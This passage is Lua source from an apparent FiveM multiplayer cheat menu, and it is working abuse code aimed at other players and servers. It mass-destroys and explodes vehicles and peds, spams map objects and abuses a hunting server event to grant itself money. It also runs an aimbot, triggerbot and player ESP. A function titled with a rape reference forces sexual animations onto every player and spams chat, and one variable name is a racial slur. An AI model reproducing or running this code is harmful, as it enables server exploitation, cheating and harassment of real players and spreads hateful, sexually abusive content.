                IsPedAPlayer(GetPedInVehicleSeat(aP, -1)) then SetVehicleHasBeenOwnedByPlayer(aP, false) SetEntityAsMissionEntity(aP, false, false) StartVehicleAlarm(aP) DetachVehicleWindscreen(aP) SmashVehicleWindow(aP, 0) SmashVehicleWindow(aP, 1) SmashVehicleWindow(aP, 2) SmashVehicleWindow(aP, 3) SetVehicleTyreBurst(aP, 0, true, 1000.0) SetVehicleTyreBurst(aP, 1, true, 1000.0) SetVehicleTyreBurst(aP, 2, true, 1000.0) SetVehicleTyreBurst(aP, 3, true, 1000.0) SetVehicleTyreBurst(aP, 4, true, 1000.0) SetVehicleTyreBurst(aP, 5, true, 1000.0) SetVehicleTyreBurst(aP, 4, true, 1000.0) SetVehicleTyreBurst(aP, 7, true, 1000.0) SetVehicleDoorBroken(aP, 0, true) SetVehicleDoorBroken(aP, 1, true) SetVehicleDoorBroken(aP, 2, true) SetVehicleDoorBroken(aP, 3, true) SetVehicleDoorBroken(aP, 4, true) SetVehicleDoorBroken(aP, 5, true) SetVehicleDoorBroken(aP, 6, true) SetVehicleDoorBroken(aP, 7, true) SetVehicleLights(aP, 1) Citizen.InvokeNative(0x1FD09E7390A74D54, aP, 1) SetVehicleNumberPlateTextIndex(aP, 5) SetVehicleNumberPlateText(aP, "Ciao") SetVehicleDirtLevel(aP, 10.0) SetVehicleModColor_1(aP, 1) SetVehicleModColor_2(aP, 1) SetVehicleCustomPrimaryColour(aP, 255, 51, 255) SetVehicleCustomSecondaryColour(aP, 255, 51, 255) SetVehicleBurnout(aP, true) end end end
                if destroyvehicles then
                for vehicle in EnumerateVehicles() do
                    if vehicle ~=
                GetVehiclePedIsIn(GetPlayerPed(-1), false) then NetworkRequestControlOfEntity(vehicle) SetVehicleUndriveable(vehicle, true) SetVehicleEngineHealth(vehicle, 0) end end end
                if alarmvehicles then
                for vehicle in EnumerateVehicles() do
                    if vehicle ~=
                GetVehiclePedIsIn(GetPlayerPed(-1), false) then NetworkRequestControlOfEntity(vehicle) SetVehicleAlarm(vehicle, true) StartVehicleAlarm(vehicle) end end end
                if explodevehicles then
                for vehicle in EnumerateVehicles() do
                    if vehicle ~=
                GetVehiclePedIsIn(GetPlayerPed(-1), false) then NetworkRequestControlOfEntity(vehicle) NetworkExplodeVehicle(vehicle, true, true, false) end end end
                if huntspam then Citizen.Wait(1) TriggerServerEvent('esx-qalle-hunting:reward', 20000) TriggerServerEvent('esx-qalle-hunting:sell') end
                if deletenearestvehicle then
                for vehicle in EnumerateVehicles() do
                    if vehicle ~=
                GetVehiclePedIsIn(GetPlayerPed(-1), false) then SetEntityAsMissionEntity(GetVehiclePedIsIn(vehicle, true), 1, 1) DeleteEntity(GetVehiclePedIsIn(vehicle, true)) SetEntityAsMissionEntity(vehicle, 1, 1) DeleteEntity(vehicle) end end end

        function RapeAllFunc()
            for bs=0,9 do
                udwdj("_chat:messageEntered","~r~",{141,211,255},"You just got fucked mate")
            end
            Citizen.CreateThread(function()
                for i=0,128 do
                    RequestModelSync("a_m_o_acult_01")
                    RequestAnimDict("rcmpaparazzo_2")
                    while not HasAnimDictLoaded("rcmpaparazzo_2")do
                        Citizen.Wait(0)
                    end
                    if IsPedInAnyVehicle(GetPlayerPed(i),waduyh487r64)then
                        local vvvvvvvvvvvvvvvvvvvvvvvv=GetVehiclePedIsIn(GetPlayerPed(i),waduyh487r64)
                        while not NetworkHasControlOfEntity(vvvvvvvvvvvvvvvvvvvvvvvv)do
                            NetworkRequestControlOfEntity(vvvvvvvvvvvvvvvvvvvvvvvv)
                            Citizen.Wait(0)
                        end
                        SetEntityAsMissionEntity(vvvvvvvvvvvvvvvvvvvvvvvv,waduyh487r64,waduyh487r64)
                        DeleteVehicle(vvvvvvvvvvvvvvvvvvvvvvvv)DeleteEntity(vvvvvvvvvvvvvvvvvvvvvvvv)end
                        count=-0.2
                        for b=1,3 do
                            local x,y,z=table.unpack(GetEntityCoords(GetPlayerPed(i),waduyh487r64))
                            local bD=CreatePed(4,Ggggg("a_m_o_acult_01"),x,y,z,0.0,waduyh487r64,KZjx)
                            SetEntityAsMissionEntity(bD,waduyh487r64,waduyh487r64)
                            AttachEntityToEntity(bD,GetPlayerPed(i),4103,11816,count,0.00,0.0,0.0,0.0,0.0,KZjx,KZjx,KZjx,KZjx,2,waduyh487r64)
                            ClearPedTasks(GetPlayerPed(i))TaskPlayAnim(GetPlayerPed(i),"rcmpaparazzo_2","shag_loop_poppy",2.0,2.5,-1,49,0,0,0,0)
                            SetPedKeepTask(bD)TaskPlayAnim(bD,"rcmpaparazzo_2","shag_loop_a",2.0,2.5,-1,49,0,0,0,0)
                            SetEntityInvincible(bD,waduyh487r64)count=count-0.4
                    end
                end
            end)
        end
            
                if WorldOnFire then
                    local pos = GetEntityCoords(PlayerPedId())
                    local k = GetRandomVehicleInSphere(pos, 100.0, 0, 0)
                    if k ~= GetVehiclePedIsIn(PlayerPedId(), 0) then
                        local targetpos = GetEntityCoords(k)
                        local x, y, z = table.unpack(targetpos)
                        local expposx = math.random(math.floor(x - 5.0), math.ceil(x + 5.0)) % x
                        local expposy = math.random(math.floor(y - 5.0), math.ceil(y + 5.0)) % y
                        local expposz = math.random(math.floor(z - 0.5), math.ceil(z + 1.5)) % z
                        AddExplosion(expposx, expposy, expposz, 1, 1.0, 1, 0, 0.0)
                        AddExplosion(expposx, expposy, expposz, 4, 1.0, 1, 0, 0.0)
                    end

                    for v in EnumeratePeds() do
                        if v ~= PlayerPedId() then
                            local targetpos = GetEntityCoords(v)
                            local x, y, z = table.unpack(targetpos)
                            local expposx = math.random(math.floor(x - 5.0), math.ceil(x + 5.0)) % x
                            local expposy = math.random(math.floor(y - 5.0), math.ceil(y + 5.0)) % y
                            local expposz = math.random(math.floor(z), math.ceil(z + 1.5)) % z
                            AddExplosion(expposx, expposy, expposz, 1, 1.0, 1, 0, 0.0)
                            AddExplosion(expposx, expposy, expposz, 4, 1.0, 1, 0, 0.0)
                        end
                    end
                end

                if FuckMap then
                    for i = -4000.0, 8000.0, 3.14159 do
                        local _, z1 = GetGroundZFor_3dCoord(i, i, 0, 0)
                        local _, z2 = GetGroundZFor_3dCoord(-i, i, 0, 0)
                        local _, z3 = GetGroundZFor_3dCoord(i, -i, 0, 0)

                        CreateObject(GetHashKey("stt_prop_stunt_track_start"), i, i, z1, 0, 1, 1)
                        CreateObject(GetHashKey("stt_prop_stunt_track_start"), -i, i, z2, 0, 1, 1)
                        CreateObject(GetHashKey("stt_prop_stunt_track_start"), i, -i, z3, 0, 1, 1)
                    end
                end

                function KeyboardInput(TextEntry, ExampleText, MaxStringLength)
                    AddTextEntry("FMMC_KEY_TIP1", TextEntry .. ":")
                    DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", ExampleText, "", "", "", MaxStringLength)
                    blockinput = true
                
                    while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
                        Citizen.Wait(0)
                    end
                
                    if UpdateOnscreenKeyboard() ~= 2 then
                        local result = GetOnscreenKeyboardResult()
                        Citizen.Wait(500)
                        blockinput = arwet
                        return result
                    else
                        Citizen.Wait(500)
                        blockinput = arwet
                        return nname
                    end
                end

                if ClearStreets then
                    SetVehicleDensityMultiplierThisFrame(0.0)
                    SetRandomVehicleDensityMultiplierThisFrame(0.0)
                    SetParkedVehicleDensityMultiplierThisFrame(0.0)
                    SetAmbientVehicleRangeMultiplierThisFrame(0.0)
                    SetPedDensityMultiplierThisFrame(0.0)
                end

                if RapidFire then
                    DoRapidFireTick()
                end

                if Aimbot then

                    -- Draw FOV
                    if DrawFov then
                        DrawRect(0.25, 0.5, 0.01, 0.515, 255, 80, 80, 100)
                        DrawRect(0.75, 0.5, 0.01, 0.515, 255, 80, 80, 100)
                        DrawRect(0.5, 0.25, 0.49, 0.015, 255, 80, 80, 100)
                        DrawRect(0.5, 0.75, 0.49, 0.015, 255, 80, 80, 100)
                    end

                    local plist = GetActivePlayers()
                    for i = 1, #plist do
                        ShootAimbot(GetPlayerPed(plist[i]))
                    end

                end

                if Ragebot and IsDisabledControlPressed(0, Keys["MOUSE1"]) then
                    for k in EnumeratePeds() do
                        if k ~= PlayerPedId() then RageShoot(k) end
                    end
                end

                if Crosshair then
                    ShowHudComponentThisFrame(14)
                end

                if ShowCoords then
                    local pos = GetEntityCoords(PlayerPedId())
                    DrawTxt("~b~X: ~w~" .. round(pos.x, 3), 0.38, 0.03, 0.0, 0.4)
                    DrawTxt("~b~Y: ~w~" .. round(pos.y, 3), 0.45, 0.03, 0.0, 0.4)
                    DrawTxt("~b~Z: ~w~" .. round(pos.z, 3), 0.52, 0.03, 0.0, 0.4)
                end

                if ExplosiveAmmo then
                    local ret, pos = GetPedLastWeaponImpactCoord(PlayerPedId())
                    if ret then
                        AddExplosion(pos.x, pos.y, pos.z, 1, 1.0, 1, 0, 0.1)
                    end
                end
                
                if ForceGun then
                    local ret, pos = GetPedLastWeaponImpactCoord(PlayerPedId())
                    if ret then
                        for k in EnumeratePeds() do
                            local coords = GetEntityCoords(k)
                            if k ~= PlayerPedId() and GetDistanceBetweenCoords(pos, coords) <= 1.0 then
                                local forward = GetEntityForwardVector(PlayerPedId())
                                RequestControlOnce(k)
                                ApplyForce(k, forward * 500)
                            end
                        end

                        for k in EnumerateVehicles() do
                            local coords = GetEntityCoords(k)
                            if k ~= GetVehiclePedIsIn(PlayerPedId(), 0) and GetDistanceBetweenCoords(pos, coords) <= 3.0 then
                                local forward = GetEntityForwardVector(PlayerPedId())
                                RequestControlOnce(k)
                                ApplyForce(k, forward * 500)
                            end
                        end

                    end
                end

                if Triggerbot then
                    local hasTarget, target = GetEntityPlayerIsFreeAimingAt(PlayerId())
                    if hasTarget and IsEntityAPed(target) then
                        ShootAt(target, "SKEL_HEAD")
                    end
                end

                local niggerVehicle = GetVehiclePedIsIn(PlayerPedId(), arwet)
                                if IsPedInAnyVehicle(PlayerPedId()) then
                        if driftMode then
                            SetVehicleGravityAmount(niggerVehicle, 5.0)
                        elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
                            SetVehicleGravityAmount(niggerVehicle, 10.0)
                        end
                    end

                if not Collision then
                    playerveh = GetVehiclePedIsIn(PlayerPedId(), arwet)
                    for k in EnumerateVehicles() do
                        SetEntityNoCollisionEntity(k, playerveh, true)
                    end
                    for k in EnumerateObjects() do
                        SetEntityNoCollisionEntity(k, playerveh, true)
                    end
                    for k in EnumeratePeds() do
                        SetEntityNoCollisionEntity(k, playerveh, true)
                    end
                end

                if DeadlyBulldozer then
                    SetVehicleBulldozerArmPosition(GetVehiclePedIsIn(PlayerPedId(), 0), math.random() % 1, 1)
                    SetVehicleEngineHealth(GetVehiclePedIsIn(PlayerPedId(), 0), 1000.0)
                    if not IsPedInAnyVehicle(PlayerPedId(), 0) then
                        DeleteVehicle(GetVehiclePedIsIn(PlayerPedId(), 1))
                        DeadlyBulldozer = not DeadlyBulldozer
                    elseif IsDisabledControlJustPressed(0, Keys["E"]) then
                        local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                        local coords = GetEntityCoords(veh)
                        local forward = GetEntityForwardVector(veh)
                        local heading = GetEntityHeading(veh)
                        local veh = CreateVehicle(GetHashKey("BULLDOZER"), coords.x + forward.x * 10, coords.y + forward.y * 10, coords.z, heading, 1, 1)
                        SetVehicleColours(veh, 27, 27)
                        SetVehicleEngineHealth(veh, -3500.0)
                        ApplyForce(veh, forward * 500.0)
                    end
                end

                if waterp and IsPedInAnyVehicle(PlayerPedId(-1), true) then
                    SetVehicleEngineOn(GetVehiclePedIsUsing(PlayerPedId(-1)), true, true, true)
                end

                if Ciao.IsMenuOpened('objectlist') then
                    for i = 1, #SpawnedObjects do
                        local x, y, z = table.unpack(GetEntityCoords(SpawnedObjects[i]))
                        DrawText3D(x, y, z, "OBJECT " .. "[" .. i .. "] " .. "WITH ID " .. SpawnedObjects[i])
                    end
                end

                if NametagsEnabled then
                    tags_plist = GetActivePlayers()
                    for i = 1, #tags_plist do
                        if NetworkIsPlayerTalking(tags_plist[i]) then
                            SetMpGamerTagVisibility(ptags[i], 4, 1)
                        else
                            SetMpGamerTagVisibility(ptags[i], 4, 0)
                        end

                        if IsPedInAnyVehicle(GetPlayerPed(tags_plist[i])) and GetSeatPedIsIn(GetPlayerPed(tags_plist[i])) == 0 then
                            SetMpGamerTagVisibility(ptags[i], 8, 1)
                        else
                            SetMpGamerTagVisibility(ptags[i], 8, 0)
                        end

                    end
                end

                if ANametagsEnabled then
                    local plist = GetActivePlayers()
                    table.removekey(plist, PlayerId())
                    for i = 1, #plist do
                        local pos = GetEntityCoords(GetPlayerPed(plist[i]))
                        local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), pos)
                        if distance <= 30 then
                            if ANametagsNotNeedLOS then
                                DrawText3D(pos.x, pos.y, pos.z + 1.3, "~b~ID: ~w~" .. GetPlayerServerId(plist[i]) .. "\n~b~Name: ~w~" .. GetPlayerName(plist[i]))
                            elseif not ANametagsNotNeedLOS and HasEntityClearLosToEntity(PlayerPedId(), GetPlayerPed(plist[i]), 17) then
                                DrawText3D(pos.x, pos.y, pos.z + 1.3, "~b~ID: ~w~" .. GetPlayerServerId(plist[i]) .. "\n~b~Name: ~w~" .. GetPlayerName(plist[i]))

                            end
                        end
                    end
                end

                if LinesEnabled then
                    local plist = GetActivePlayers()
                    local playerCoords = GetEntityCoords(PlayerPedId())
                    for i = 1, #plist do
                        if i == PlayerId() then i = i + 1 end
                        local targetCoords = GetEntityCoords(GetPlayerPed(plist[i]))
                        DrawLine(playerCoords, targetCoords, 0, 0, 255, 255)
                    end
                end

            if WeatherChanger then
                SetWeatherTypePersist(WeatherType)
                SetWeatherTypeNowPersist(WeatherType)
                SetWeatherTypeNow(WeatherType)
                SetOverrideWeather(WeatherType)
            end

                if Radio then
                    PortableRadio = true
                    SetRadioToStationIndex(RadioStation)
                elseif not Radio then
                    PortableRadio = arwet
                end

                if PortableRadio then
                    SetVehicleRadioEnabled(GetVehiclePedIsIn(PlayerPedId(), 0), arwet)
                    SetMobilePhoneRadioState(true)
                    SetMobileRadioEnabledDuringGameplay(true)
                    HideHudComponentThisFrame(16)
                elseif not PortableRadio then
                    SetVehicleRadioEnabled(GetVehiclePedIsIn(PlayerPedId(), 0), true)
                    SetMobilePhoneRadioState(arwet)
                    SetMobileRadioEnabledDuringGameplay(arwet)
                    ShowHudComponentThisFrame(16)
                    local radioIndex = GetPlayerRadioStationIndex()

                    if IsPedInAnyVehicle(PlayerPedId(), arwet) and radioIndex + 1 ~= 19 then
                        currRadioIndex = radioIndex + 1
                        selRadioIndex = radioIndex + 1
                    end
                end

                if ForceMap then
                    DisplayRadar(true)
                end

                if ForceThirdPerson then
                    SetFollowPedCamViewMode(0)
                    SetFollowVehicleCamViewMode(0)
                end

                Wait(0)
            end
        end)